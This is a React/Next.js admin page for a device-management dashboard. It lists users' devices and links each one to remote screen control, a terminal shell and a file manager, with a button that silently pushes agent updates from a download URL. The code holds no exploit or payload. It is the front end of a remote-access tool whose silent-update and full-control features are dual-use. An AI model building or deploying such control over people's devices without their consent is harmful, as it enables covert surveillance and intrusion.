"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import Link from "next/link";
import { AppSidebar } from "@/components/app-sidebar";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { Skeleton } from "@/components/ui/skeleton";
import { useGateway } from "@/hooks/use-gateway";
import { alertMsg, Z } from "@/lib/messages";
import { 
  Search, 
  Filter, 
  Smartphone, 
  Monitor, 
  Terminal, 
  Folder,
  AlertCircle,
  RefreshCw,
} from "lucide-react";

type AdminDevice = {
  deviceId: string;
  userId: string;
  hostname: string;
  platform?: string;
  status: string;
  lastSeen?: string;
  battery?: number | null;
  storage?: number | null;
};

export default function AdminDevicesPage() {
  const router = useRouter();
  const { dispatch, ensureConnected } = useGateway();
  const [devices, setDevices] = useState<AdminDevice[]>([]);
  const [error, setError] = useState("");
  const [searchQuery, setSearchQuery] = useState("");
  const [filterStatus, setFilterStatus] = useState("all");
  const [isLoading, setIsLoading] = useState(true);
  const [updatingId, setUpdatingId] = useState<string | null>(null);
  const [updatingAll, setUpdatingAll] = useState(false);

  useEffect(() => {
    (async () => {
      try {
        const session = await fetch("/api/auth/session", { credentials: "include" });
        const sessionData = await session.json().catch(() => ({}));
        const canAdmin = sessionData?.user?.role === "admin" || (Array.isArray(sessionData?.user?.pages) && sessionData.user.pages.includes("admin"));
      if (!session.ok || !canAdmin) {
          router.replace("/dashboard");
          return;
        }
        
        const res = await fetch("/api/admin/devices", { credentials: "include" });
        const data = await res.json();
        
        if (!res.ok) {
          setError(data.message || "Failed to load devices");
          return;
        }
        setDevices(data.devices || []);
      } catch (err) {
        setError("An error occurred while fetching devices.");
      } finally {
        setIsLoading(false);
      }
    })();
  }, [router]);

  // Dynamic filtering based on search query and status chip
  const filteredDevices = devices.filter((device) => {
    const matchesStatus = filterStatus === "all" || device.status === filterStatus;
    const searchLower = searchQuery.toLowerCase();
    const matchesSearch = 
      (device.hostname || "").toLowerCase().includes(searchLower) ||
      (device.deviceId || "").toLowerCase().includes(searchLower) ||
      (device.userId || "").toLowerCase().includes(searchLower);
      
    return matchesStatus && matchesSearch;
  });

  // Calculate stats dynamically
  const totalDevices = devices.length;
  const onlineDevices = devices.filter((d) => d.status === "online").length;
  const offlineDevices = totalDevices - onlineDevices;

  const agentDownloadUrl = () =>
    process.env.NEXT_PUBLIC_AGENT_DOWNLOAD_URL ||
    `${typeof window !== "undefined" ? window.location.origin : ""}/api/agent/download`;

  const updateAgent = (deviceId: string) => {
    ensureConnected();
    setUpdatingId(deviceId);
    const result = dispatch("UPDATE_AGENT", { download_url: agentDownloadUrl() }, deviceId);
    if (!result.ok) {
      alertMsg(Z.COMMAND_FAILED);
      setUpdatingId(null);
      return;
    }
    alertMsg(Z.AGENT_UPDATE_SENT);
    setTimeout(() => setUpdatingId(null), 8000);
  };

  const updateAllOnline = () => {
    const online = devices.filter((d) => d.status === "online");
    if (online.length === 0) {
      alertMsg(Z.NO_AGENT);
      return;
    }
    ensureConnected();
    setUpdatingAll(true);
    let sent = 0;
    for (const device of online) {
      const result = dispatch("UPDATE_AGENT", { download_url: agentDownloadUrl() }, device.deviceId);
      if (result.ok) sent += 1;
    }
    if (sent > 0) alertMsg(Z.AGENT_UPDATE_SENT, `${sent} device(s)`);
    else alertMsg(Z.COMMAND_FAILED);
    setTimeout(() => setUpdatingAll(false), 8000);
  };

  if (isLoading) {

    return (
      <div className="flex h-screen bg-background">
        <AppSidebar />

        <main className="flex-1 lg:ml-64 overflow-auto">
          <div className="p-6 lg:p-12">
            <Skeleton className="h-12 w-72 mb-3" />
            <Skeleton className="h-5 w-96 mb-8" />

            <div className="grid grid-cols-1 md:grid-cols-4 gap-4 mb-8">
              {Array.from({ length: 4 }).map((_, index) => (
                <Card key={index} className="p-4 border border-border bg-card">
                  <Skeleton className="h-3 w-24 mb-2" />
                  <Skeleton className="h-8 w-16" />
                </Card>
              ))}
            </div>

            <div className="flex flex-col sm:flex-row gap-4 mb-8">
              <Skeleton className="h-12 w-full rounded-lg" />
              <Skeleton className="h-12 w-32 rounded-lg" />
            </div>

            <div className="flex gap-2 mb-8 flex-wrap">
              {Array.from({ length: 3 }).map((_, index) => (
                <Skeleton key={index} className="h-9 w-24 rounded-full" />
              ))}
            </div>

            <div className="space-y-3">
              {Array.from({ length: 4 }).map((_, index) => (
                <Card key={index} className="p-4 border border-border bg-card">
                  <div className="flex items-start gap-4">
                    <Skeleton className="h-12 w-12 rounded-lg" />
                    <div className="flex-1 space-y-3">
                      <div className="flex items-center justify-between">
                        <Skeleton className="h-5 w-36" />
                        <Skeleton className="h-7 w-20 rounded-full" />
                      </div>
                      <div className="grid grid-cols-2 md:grid-cols-5 gap-4">
                        {Array.from({ length: 5 }).map((_, cardIndex) => (
                          <Skeleton key={cardIndex} className="h-10 w-full rounded-md" />
                        ))}
                      </div>
                    </div>
                  </div>
                </Card>
              ))}
            </div>
          </div>
        </main>
      </div>
    );
  }

  return (
    <div className="flex h-screen bg-background">
      <AppSidebar />

      {/* Main content */}
      <main className="flex-1 lg:ml-64 overflow-auto">
        <div className="p-6 lg:p-12">
          {/* Header */}
          <div className="mb-8">
            <div className="flex flex-col sm:flex-row sm:items-end justify-between gap-4 mb-4">
              <div>
                <h1 className="text-4xl lg:text-5xl font-display tracking-tight mb-2">
                  Device Management
                </h1>
                <p className="text-muted-foreground">Admin can open and control any device on the platform</p>
              </div>
              <Button
                type="button"
                onClick={() => updateAllOnline()}
                disabled={updatingAll || onlineDevices === 0}
                className="gap-2"
              >
                <RefreshCw className={`w-4 h-4 ${updatingAll ? "animate-spin" : ""}`} />
                {updatingAll ? "Updating…" : "Update all online agents"}
              </Button>
            </div>
          </div>

          {/* Error Banner */}
          {error && (
            <div className="mb-6 flex items-center gap-2 p-4 text-sm text-destructive bg-destructive/10 rounded-lg border border-destructive/20">
              <AlertCircle className="w-4 h-4" />
              {error}
            </div>
          )}

          {/* Stats */}
          <div className="grid grid-cols-1 md:grid-cols-4 gap-4 mb-8">
            <Card className="p-4 border border-border bg-card">
              <p className="text-xs text-muted-foreground mb-1">Total Devices</p>
              <p className="text-2xl font-display">{isLoading ? "-" : totalDevices}</p>
            </Card>
            <Card className="p-4 border border-border bg-card">
              <p className="text-xs text-muted-foreground mb-1">Online</p>
              <p className="text-2xl font-display text-green-600">{isLoading ? "-" : onlineDevices}</p>
            </Card>
            <Card className="p-4 border border-border bg-card">
              <p className="text-xs text-muted-foreground mb-1">Offline</p>
              <p className="text-2xl font-display text-gray-600">{isLoading ? "-" : offlineDevices}</p>
            </Card>
            <Card className="p-4 border border-border bg-card">
              <p className="text-xs text-muted-foreground mb-1">System Status</p>
              <p className="text-2xl font-display text-blue-600">Active</p>
            </Card>
          </div>

          {/* Search and filters */}
          <div className="flex flex-col sm:flex-row gap-4 mb-8">
            <div className="flex-1 relative">
              <Search className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
              <input
                type="text"
                placeholder="Search devices by name, ID, or owner..."
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                className="w-full pl-12 pr-4 py-3 border border-border rounded-lg bg-background focus:outline-none focus:ring-2 focus:ring-foreground/20"
              />
            </div>
            <Button variant="outline" className="border-border hover:bg-accent/10 gap-2 whitespace-nowrap">
              <Filter className="w-4 h-4" />
              More Filters
            </Button>
          </div>

          {/* Status filter */}
          <div className="flex gap-2 mb-8 flex-wrap">
            {[
              { id: "all", label: "All Devices" },
              { id: "online", label: "Online" },
              { id: "offline", label: "Offline" },
            ].map((status) => (
              <button
                key={status.id}
                onClick={() => setFilterStatus(status.id)}
                className={`px-4 py-2 rounded-full text-sm transition-colors ${
                  filterStatus === status.id
                    ? "bg-foreground text-background"
                    : "bg-secondary text-foreground hover:bg-secondary/80"
                }`}
              >
                {status.label}
              </button>
            ))}
          </div>

          {/* Devices list */}
          <div className="space-y-3">
            {!isLoading && filteredDevices.length === 0 && (
              <Card className="p-8 text-center text-muted-foreground border-dashed">
                {searchQuery ? "No devices match your search." : "No devices registered."}
              </Card>
            )}

            {filteredDevices.map((device) => {
              const batteryRaw = device.battery as unknown;
              const storageRaw = device.storage as unknown;
              const batteryLevel =
                typeof batteryRaw === "number" && Number.isFinite(batteryRaw)
                  ? batteryRaw
                  : typeof batteryRaw === "string" && batteryRaw.trim() !== "" && Number.isFinite(Number(batteryRaw))
                    ? Number(batteryRaw)
                    : null;
              const storageLevel =
                typeof storageRaw === "number" && Number.isFinite(storageRaw)
                  ? storageRaw
                  : typeof storageRaw === "string" && storageRaw.trim() !== "" && Number.isFinite(Number(storageRaw))
                    ? Number(storageRaw)
                    : null;
              const lastSeenLabel = device.lastSeen
                ? new Date(device.lastSeen).toLocaleString()
                : "Unknown";

              return (
                <Card
                  key={device.deviceId}
                  className="p-4 border border-border bg-card hover:bg-accent/5 transition-colors group"
                >
                  <div className="flex items-start gap-4">
                    {/* Device info */}
                    <div className="w-12 h-12 bg-sidebar rounded-lg flex items-center justify-center flex-shrink-0">
                      <Smartphone className="w-6 h-6" />
                    </div>

                    <div className="flex-1 min-w-0">
                      <div className="flex items-start justify-between gap-2 mb-2">
                        <div>
                          <h3 className="font-semibold">{device.hostname || "Unknown Device"}</h3>
                          <p className="text-sm text-muted-foreground">{device.userId || "No owner"}</p>
                        </div>
                        <div
                          className={`inline-flex items-center gap-1.5 px-3 py-1.5 rounded-full text-xs font-mono ${
                            device.status === "online"
                              ? "bg-green-500/20 text-green-700"
                              : "bg-gray-500/20 text-gray-700"
                          }`}
                        >
                          <span
                            className={`w-2 h-2 rounded-full ${
                              device.status === "online" ? "bg-green-600" : "bg-gray-600"
                            }`}
                          />
                          {device.status === "online" ? "Online" : "Offline"}
                        </div>
                      </div>

                      {/* Device details grid */}
                      <div className="grid grid-cols-2 md:grid-cols-5 gap-4 mt-3 items-end">
                        <div>
                          <p className="text-xs text-muted-foreground mb-1">ID / Model</p>
                          <p className="text-xs font-mono truncate" title={device.deviceId}>
                            {device.deviceId.substring(0, 10)}...
                          </p>
                        </div>
                        <div>
                          <p className="text-xs text-muted-foreground mb-1">Platform</p>
                          <p className="text-sm">{device.platform || "unknown"}</p>
                        </div>
                        <div>
                          <p className="text-xs text-muted-foreground mb-1">Battery</p>
                          {batteryLevel == null ? (
                            <p className="text-xs font-mono text-muted-foreground">N/A</p>
                          ) : (
                            <div className="flex items-center gap-2">
                              <div className="flex-1 bg-border rounded-full h-2">
                                <div
                                  className={`h-full rounded-full ${
                                    batteryLevel > 50
                                      ? "bg-green-600"
                                      : batteryLevel > 20
                                      ? "bg-orange-600"
                                      : "bg-red-600"
                                  }`}
                                  style={{ width: `${batteryLevel}%` }}
                                />
                              </div>
                              <span className="text-xs font-mono w-8">{batteryLevel}%</span>
                            </div>
                          )}
                        </div>
                        <div>
                          <p className="text-xs text-muted-foreground mb-1">Storage</p>
                          {storageLevel == null ? (
                            <p className="text-xs font-mono text-muted-foreground">N/A</p>
                          ) : (
                            <div className="flex items-center gap-2">
                              <div className="flex-1 bg-border rounded-full h-2">
                                <div
                                  className="h-full rounded-full bg-blue-600"
                                  style={{ width: `${storageLevel}%` }}
                                />
                              </div>
                              <span className="text-xs font-mono w-8">{storageLevel}%</span>
                            </div>
                          )}
                        </div>
                        <div>
                          <p className="text-xs text-muted-foreground mb-1">Last Seen</p>
                          <p className="text-xs font-mono">{lastSeenLabel}</p>
                        </div>
                      </div>
                    </div>

                    {/* Actions - Mapped from your logic links to icons */}
                    <div className="flex flex-col sm:flex-row items-center gap-1 opacity-100 lg:opacity-0 lg:group-hover:opacity-100 transition-opacity flex-shrink-0">
                      <button
                        type="button"
                        className="p-2 hover:bg-accent/10 rounded transition-colors text-muted-foreground hover:text-foreground disabled:opacity-40"
                        title="Silent update agent"
                        disabled={device.status !== "online" || updatingId === device.deviceId || updatingAll}
                        onClick={() => updateAgent(device.deviceId)}
                      >
                        <RefreshCw className={`w-4 h-4 ${updatingId === device.deviceId ? "animate-spin" : ""}`} />
                      </button>
                      <Link href={`/screen?device=${encodeURIComponent(device.deviceId)}`}>
                        <button
                          className="p-2 hover:bg-accent/10 rounded transition-colors text-muted-foreground hover:text-foreground"
                          title="Screen Control"
                        >
                          <Monitor className="w-4 h-4" />
                        </button>
                      </Link>
                      
                      <Link href={`/shell?device=${encodeURIComponent(device.deviceId)}`}>
                        <button
                          className="p-2 hover:bg-accent/10 rounded transition-colors text-muted-foreground hover:text-foreground"
                          title="Terminal Shell"
                        >
                          <Terminal className="w-4 h-4" />
                        </button>
                      </Link>
                      
                      <Link href={`/files?device=${encodeURIComponent(device.deviceId)}`}>
                        <button
                          className="p-2 hover:bg-accent/10 rounded transition-colors text-muted-foreground hover:text-foreground"
                          title="File Manager"
                        >
                          <Folder className="w-4 h-4" />
                        </button>
                      </Link>
                    </div>
                  </div>
                </Card>
              );
            })}
          </div>

          {/* Pagination */}
          {!isLoading && devices.length > 0 && (
            <div className="mt-8 flex items-center justify-between">
              <p className="text-sm text-muted-foreground">
                Showing {filteredDevices.length} of {devices.length} devices
              </p>
              <div className="flex gap-2">
                <Button variant="outline" className="border-border hover:bg-accent/10" disabled>
                  Previous
                </Button>
                <Button variant="outline" className="border-border hover:bg-accent/10" disabled>
                  Next
                </Button>
              </div>
            </div>
          )}
        </div>
      </main>
    </div>
  );
}